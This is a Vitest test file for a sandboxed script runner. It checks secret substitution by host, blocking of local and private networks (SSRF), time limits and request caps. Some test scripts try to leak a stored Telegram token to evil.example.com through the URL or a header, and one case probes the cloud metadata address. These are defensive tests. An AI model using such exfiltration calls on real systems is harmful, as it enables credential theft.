import { afterAll, describe, expect, it } from 'vitest'
import { setupTempDb } from './helpers'

const cleanup = await setupTempDb()
const { runScript, checkSyntax } = await import('@/lib/scripts/sandbox')
const { saveSecret, SecretVault } = await import('@/lib/scripts/secrets')
const { isPrivateAddress, assertPublicUrl } = await import('@/lib/scripts/net')
const { getDb } = await import('@/lib/db')
const { script } = await import('@/lib/db/schema')

afterAll(cleanup)

getDb().insert(script).values({ id: 's1', name: 'test', schedule: '* * * * *', code: '', codeHash: 'x', createdAt: new Date(), updatedAt: new Date() }).run()
saveSecret({ name: 'TG_TOKEN', value: '8123:AAF-secret-token', hosts: ['api.telegram.org'] })

type Req = { url: string; init: { method: string; headers: Record<string, string>; body?: string } }
function fakeFetch(reqs: Req[], reply: (r: Req) => Response = () => Response.json({ ok: true })) {
  return async (url: string, init: Req['init']) => {
    const r = { url, init }
    reqs.push(r)
    return reply(r)
  }
}

describe('sandbox', () => {
  it('runs async code, returns values and keeps logs', async () => {
    const r = await runScript('s1', `log('hi', { a: 1 }); return { sum: 1 + 2 }`)
    expect(r).toMatchObject({ ok: true, output: '{\n  "sum": 3\n}', logs: ['hi {"a":1}'] })
  })

  it('has no Node or host access', async () => {
    const r = await runScript('s1', `return [typeof require, typeof process, typeof setTimeout, typeof Buffer].join()`)
    expect(r.output).toBe('undefined,undefined,undefined,undefined')
  })

  it('stops infinite loops and reports errors with the line', async () => {
    const loop = await runScript('s1', 'while (true) {}', {})
    expect(loop).toMatchObject({ ok: false, error: expect.stringContaining('Превышено время') })
    const err = await runScript('s1', `const a = 1\nthrow new Error('boom')`)
    expect(err.error).toBe('Error: boom (строка 2)')
  }, 40_000)

  it('substitutes secrets only for their hosts and never shows the value', async () => {
    const reqs: Req[] = []
    const ok = await runScript('s1', `
      const r = await fetch('https://api.telegram.org/bot{{secret:TG_TOKEN}}/sendMessage', { method: 'POST', body: { chat_id: 1, text: 'hi' } })
      log('status', r.status, 'echo 8123:AAF-secret-token')
      return (await r.json()).ok`, { fetchImpl: fakeFetch(reqs) })
    expect(ok).toMatchObject({ ok: true, output: 'true' })
    expect(reqs[0]!.url).toBe('https://api.telegram.org/bot8123:AAF-secret-token/sendMessage')
    expect(reqs[0]!.init.headers['Content-Type']).toBe('application/json')
    expect(ok.logs[0]).toBe('status 200 echo {{secret:TG_TOKEN}}')

    const stolen = await runScript('s1', `await fetch('https://evil.example.com/?t={{secret:TG_TOKEN}}')`, { fetchImpl: fakeFetch(reqs) })
    expect(stolen).toMatchObject({ ok: false, error: expect.stringContaining('нельзя отправлять на evil.example.com') })
    const viaHeader = await runScript('s1', `await fetch('https://evil.example.com/', { headers: { X: '{{secret:TG_TOKEN}}' } })`, { fetchImpl: fakeFetch(reqs) })
    expect(viaHeader.ok).toBe(false)
    expect(reqs).toHaveLength(1)
  })

  it('refuses the local network and caps requests', async () => {
    for (const url of ['http://192.168.1.10:8080/', 'http://localhost:3000/', 'http://127.0.0.1/', 'http://169.254.169.254/latest', 'http://qbittorrent:8080/']) {
      const r = await runScript('s1', `await fetch('${url}')`, { fetchImpl: fakeFetch([]) })
      expect(r.ok, url).toBe(false)
    }
    const many = await runScript('s1', `for (let i = 0; i < 25; i++) await fetch('https://example.com/' + i)`, { fetchImpl: fakeFetch([]) })
    expect(many.error).toContain('Больше 20 запросов')
  })

  it('keeps state between runs and calls read-only hub tools', async () => {
    await runScript('s1', `state.set('seen', ['a'])`)
    const r = await runScript('s1', `const s = state.get('seen'); s.push('b'); state.set('seen', s); return s.join(',') + ' ' + await hub.tool('torrents_status', { filter: 'completed' })`, {
      callTool: async (name, args) => `${name}:${JSON.stringify(args)}`,
    })
    expect(r.output).toBe('a,b torrents_status:{"filter":"completed"}')
  })

  it('checks syntax without running', async () => {
    expect(await checkSyntax('return 1')).toBeNull()
    expect(await checkSyntax('return (')).toMatch(/SyntaxError/)
  })
})

describe('network policy', () => {
  it.each([
    ['10.1.2.3', true], ['172.20.0.5', true], ['192.168.0.1', true], ['127.0.0.1', true], ['169.254.169.254', true], ['100.100.1.1', true],
    ['::1', true], ['fd12::1', true], ['::ffff:192.168.1.1', true], ['8.8.8.8', false], ['149.154.167.220', false], ['2001:4860::8888', false],
  ])('%s private: %s', (ip, expected) => {
    expect(isPrivateAddress(ip)).toBe(expected)
  })

  it('rejects local names and odd schemes before DNS', () => {
    expect(() => assertPublicUrl('ftp://example.com')).toThrow()
    expect(() => assertPublicUrl('http://nas.local/')).toThrow()
    expect(() => assertPublicUrl('http://jackett:9117/')).toThrow()
    expect(assertPublicUrl('https://api.telegram.org/x').hostname).toBe('api.telegram.org')
  })

  it('vault matches wildcard hosts', () => {
    saveSecret({ name: 'API_KEY', value: 'k-123456', hosts: ['*.example.com'] })
    const v = new SecretVault()
    expect(v.substitute('{{secret:API_KEY}}', 'api.example.com')).toBe('k-123456')
    expect(() => v.substitute('{{secret:API_KEY}}', 'example.com.evil.io')).toThrow()
  })
})
